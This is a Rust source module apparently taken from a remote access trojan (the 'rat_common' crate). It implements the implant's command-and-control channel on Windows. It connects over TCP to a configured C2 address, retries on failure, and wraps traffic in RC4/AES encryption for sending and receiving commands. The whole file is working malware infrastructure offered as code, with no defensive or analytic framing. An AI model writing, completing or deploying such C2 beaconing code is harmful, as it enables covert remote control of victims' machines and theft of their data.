//! C2 network communication — TCP connection with hybrid encryption.
//!
//! This module is only compiled on Windows.

#![cfg(target_os = "windows")]

use crate::config::Config;
use rat_common::crypto::HybridCipher;
use rat_common::protocol::{FramedReader, FramedWriter};
use std::io;
use std::net::TcpStream;
use std::time::Duration;

/// A bidirectional encrypted channel to the C2 server.
pub struct C2Channel {
    pub reader: FramedReader<TcpStream>,
    pub writer: FramedWriter<TcpStream>,
}

impl C2Channel {
    /// Send a plaintext message (encrypts automatically).
    pub fn send(&mut self, data: &[u8]) -> io::Result<()> {
        self.writer.send(data)
    }

    /// Send a UTF-8 string.
    pub fn send_str(&mut self, s: &str) -> io::Result<()> {
        self.send(s.as_bytes())
    }

    /// Receive and decrypt a message. Returns `None` on EOF.
    pub fn recv(&mut self) -> io::Result<Option<Vec<u8>>> {
        self.reader.recv()
    }

    /// Receive and decrypt as a UTF-8 string.
    pub fn recv_string(&mut self) -> io::Result<Option<String>> {
        self.reader.recv_string()
    }
}

/// Attempt to connect to the C2 server with retries.
pub fn connect_to_c2(cfg: &Config) -> io::Result<C2Channel> {
    let addr = format!("{}:{}", cfg.c2_ip, cfg.c2_port);

    let mut last_err = io::Error::new(io::ErrorKind::ConnectionRefused, "no attempts made");

    for attempt in 0..cfg.max_connect_attempts {
        match TcpStream::connect(&addr) {
            Ok(stream) => {
                // Set socket options
                stream.set_read_timeout(Some(Duration::from_secs(30)))?;
                stream.set_write_timeout(Some(Duration::from_secs(10)))?;
                stream.set_nodelay(true)?;

                let cipher_r = HybridCipher::new(&cfg.rc4_key, &cfg.aes_key);
                let cipher_w = HybridCipher::new(&cfg.rc4_key, &cfg.aes_key);

                let reader = FramedReader::new(stream.try_clone()?, cipher_r);
                let writer = FramedWriter::new(stream, cipher_w);

                return Ok(C2Channel { reader, writer });
            }
            Err(e) => {
                last_err = e;
                if attempt + 1 < cfg.max_connect_attempts {
                    std::thread::sleep(Duration::from_secs(5));
                }
            }
        }
    }

    Err(last_err)
}
